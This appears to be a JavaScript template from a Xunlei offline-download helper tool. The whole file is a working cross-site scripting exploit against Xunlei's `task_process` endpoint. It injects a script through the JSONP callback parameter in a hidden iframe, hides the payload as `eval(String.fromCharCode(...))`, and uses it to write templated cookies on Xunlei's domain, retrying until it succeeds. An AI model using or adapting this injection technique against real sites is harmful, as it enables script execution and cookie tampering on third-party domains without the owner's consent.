var xss_retry = 20;
var stoped = false;
function xss() {
  if (document.cookie.indexOf("xss={{ gdriveid }}") != -1) {
    $.fancybox.close();
    document.location.reload();
    return;
  };
  if (xss_retry <= 0 || stoped) {
    $.fancybox('<div style="width:300px;"><p style="color: red;">Cookie写入失败...</p><p>您可能无法使用浏览器下载功能</p><p><a href="javascript:location.reload();">刷新重试</a>，或向作者回报这个问题：<a href="http://gplus.to/binux">+足兆叉虫</a></p></div>', {padding: 20, onClosed: function () { document.cookie = "xss={{ gdriveid }};"; }});
    return;
  };
  var script = 'document.cookie="{{ cookie }}";document.write("<iframe src=\\\"{{ request.protocol }}://{{ request.host }}/xss?gdriveid={{ gdriveid }}\\\" />");';
  var code = [];
  for (var i=0;i<script.length;i++) {
    code.push(script.charCodeAt(i));
  };
  var ts = new Date().getTime();
  var script_code = escape(code.join(","));
  var iframe = document.createElement("iframe");
  iframe.setAttribute("style", "display: none;");
  iframe.src = "http://dynamic.cloud.vip.xunlei.com/interface/task_process?callback=%3Cscript%20src%3Dtask_process%26callback%3D%28function%28%29%257Beval%28String.fromCharCode%28"+script_code+"%29%29%3B%257D%29%26ts%3D"+ts+"%3E%3C/script%3E&ts="+ts;
  iframe.addEventListener("load", function(){
    this.removeEventListener("load", arguments.call, false);
    xss();
  }, false);
  document.body.appendChild(iframe);
  xss_retry -= 1;
};
jQuery(document).ready(function() {
  if (document.cookie.indexOf("xss={{ gdriveid }}") == -1) {
    $.fancybox('<div style="width:300px">正在尝试写入cookie，请稍候...</div>', {padding: 20});
    xss();
    setTimeout(function() { stoped = true; xss(); }, 30000);
  };
});
